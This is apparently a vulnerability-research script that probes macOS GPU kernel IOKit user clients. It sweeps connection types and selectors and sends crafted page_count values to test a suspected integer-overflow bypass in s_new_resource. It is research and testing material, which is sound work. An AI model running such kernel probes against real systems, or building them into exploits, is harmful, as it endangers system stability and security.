#!/usr/bin/env python3
"""
probe_iogpu_type0.py — Discover IOGPUDeviceUserClient connection type and test s_new_resource overflow.

Background:
  Binary analysis (session-13) shows IOGPUFamily kext has TWO user client classes:
    - AGXDeviceUserClient  (type=1, 55 selectors, TABLE_A/B) — CONFIRMED empirical
    - IOGPUDeviceUserClient (type=?, 14 selectors, TABLE_C/D) — connection type UNKNOWN

  IOGPUDeviceUserClient s_new_resource (likely sel=2):
    - Reads input struct, minimum size 0x58
    - input[0x50] = page_count (u32), active when bit 3 of input[0x15] is set
    - Expected: same overflow check pattern as the retracted sel=8 claim

  Prior claim "AGXDeviceUserClient sel=8 [0x014] = page_count" is RETRACTED.
  Binary proves sel=8 never reads the input struct.

This probe:
  1. Finds which connection type (0–9) opens IOGPUDeviceUserClient (not AGXDeviceUserClient)
  2. For the found type, probes sel=2 (s_new_resource) with the page_count overflow values
  3. Also probes sel=6 of AGXDeviceUserClient (also si_sz=unlimited, may be create selector)
"""
import struct, sys

def run():
    try:
        import iokit
    except ImportError:
        print("[!] iokit module not available")
        return

    SERVICE = "AGXAccelerator"

    print(f"[*] Opening {SERVICE} at various connection types...")
    results = {}
    for t in range(8):
        try:
            conn = iokit.IOServiceOpen(SERVICE, t)
            results[t] = conn
            print(f"  type={t} → OPEN  (conn={conn:#x})")
        except Exception as e:
            print(f"  type={t} → {e}")

    # Find non-type-1 connections
    for t, conn in results.items():
        if t == 1:
            continue
        print(f"\n[*] Testing type={t} conn — probing selectors 0-13 with 0x58 zeroed struct")
        zeroed = bytes(0x58)
        for sel in range(14):
            try:
                ret, out = iokit.IOConnectCallStructMethod(conn, sel, zeroed)
                print(f"  sel={sel:2d}: ret={ret:#010x}  out_sz={len(out)}")
            except Exception as e:
                print(f"  sel={sel:2d}: {e}")

        # Test s_new_resource (expected sel=2) page_count at [0x50]
        # Activate page_count path: set bit 3 of input[0x15]
        # Also set input[0x00]=0x80 (type=0x80, which skips the lower-nibble=0 path)
        print(f"\n[*] type={t} sel=2 (s_new_resource): testing page_count overflow at [0x50]")
        for page_count, label in [
            (0x000000, "zero (error expected)"),
            (0x0007ff, "0x7ff (legitimate max: 0x7ff000 < 0x800000)"),
            (0x000800, "0x800 (boundary: 0x800000 >= 0x800000 → BadArg)"),
            (0x100000, "0x100000 (overflow wrap: 0x0 → NoRes)"),
            (0x100001, "0x100001 (overflow bypass: 0x1000 → NoRes)"),
            (0x100800, "0x100800 (overflow caught: 0x800000 → BadArg)"),
        ]:
            buf = bytearray(0x58)
            struct.pack_into('<I', buf, 0x00, 0x80)        # resource type = 0x80
            struct.pack_into('<B', buf, 0x15, 0x08)        # bit 3 set → use page_count from [0x50]
            struct.pack_into('<I', buf, 0x50, page_count)   # page_count
            try:
                ret, out = iokit.IOConnectCallStructMethod(conn, 2, bytes(buf))
                print(f"  [0x50]={page_count:#010x}  ret={ret:#010x}  ({label})")
            except Exception as e:
                print(f"  [0x50]={page_count:#010x}  error: {e}  ({label})")

    # Also test AGXDeviceUserClient type=1 sel=6 (si_sz=unlimited, unexplored create path)
    if 1 in results:
        conn1 = results[1]
        print(f"\n[*] AGXDeviceUserClient type=1 sel=6 (si_sz=unlimited, may be create)")
        zeroed = bytes(0x58)
        try:
            ret, out = iokit.IOConnectCallStructMethod(conn1, 6, zeroed)
            print(f"  sel=6 zeroed 0x58: ret={ret:#010x}")
        except Exception as e:
            print(f"  sel=6 zeroed 0x58: {e}")

        # Try with larger struct sizes
        for sz in [0x60, 0x80, 0x100, 0x200]:
            buf = bytes(sz)
            try:
                ret, out = iokit.IOConnectCallStructMethod(conn1, 6, buf)
                print(f"  sel=6 zeroed {sz:#x}: ret={ret:#010x}")
            except Exception as e:
                print(f"  sel=6 zeroed {sz:#x}: {e}")

        # Vary sel=6 input[0x14] (what the retracted empirical was testing for sel=8)
        print(f"\n[*] AGXDeviceUserClient sel=6: sweeping [0x014] for overflow pattern")
        for val in [0x000, 0x100, 0x7ff, 0x800, 0x100000, 0x100001, 0x100800]:
            buf = bytearray(0x58)
            struct.pack_into('<I', buf, 0x14, val)
            try:
                ret, out = iokit.IOConnectCallStructMethod(conn1, 6, bytes(buf))
                print(f"  sel=6 [0x14]={val:#010x}: ret={ret:#010x}")
            except Exception as e:
                print(f"  sel=6 [0x14]={val:#010x}: error: {e}")

    print("\n[*] Done")

run()
